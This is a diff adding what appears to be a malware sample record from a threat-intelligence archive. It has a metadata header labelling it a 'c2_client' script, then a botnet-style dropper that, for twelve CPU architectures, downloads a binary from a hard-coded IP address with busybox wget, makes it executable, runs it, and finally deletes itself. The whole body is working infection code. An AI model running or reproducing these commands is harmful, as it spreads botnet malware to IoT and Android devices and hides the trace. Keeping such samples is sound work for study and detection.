@@ -1,0 +1,23 @@
+# sha256: c2f932a755c6d338e036abaef06b937aaf9577a7f9b43eab6758131fbf181bc3
+# family: c2_client
+# kind: script
+# size_bytes: 1054
+# first_seen: 2026-09-15 08:00:26.411000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+busybox wget http://176.65.139.251/wife.arm; chmod 777 wife.arm; ./wife.arm android
+busybox wget http://176.65.139.251/wife.arm5; chmod 777 wife.arm5; ./wife.arm5 android
+busybox wget http://176.65.139.251/wife.arm6; chmod 777 wife.arm6; ./wife.arm6 android
+busybox wget http://176.65.139.251/wife.arm7; chmod 777 wife.arm7; ./wife.arm7 android
+busybox wget http://176.65.139.251/wife.m68k; chmod 777 wife.m68k; ./wife.m68k android
+busybox wget http://176.65.139.251/wife.mips; chmod 777 wife.mips; ./wife.mips android
+busybox wget http://176.65.139.251/wife.mpsl; chmod 777 wife.mpsl; ./wife.mpsl android
+busybox wget http://176.65.139.251/wife.ppc; chmod 777 wife.ppc; ./wife.ppc android
+busybox wget http://176.65.139.251/wife.sh4; chmod 777 wife.sh4; ./wife.sh4 android
+busybox wget http://176.65.139.251/wife.spc; chmod 777 wife.spc; ./wife.spc android
+busybox wget http://176.65.139.251/wife.x86; chmod 777 wife.x86; ./wife.x86 android
+busybox wget http://176.65.139.251/wife.x86_64; chmod 777 wife.x86_64; ./wife.x86_64 android
+
+rm $0
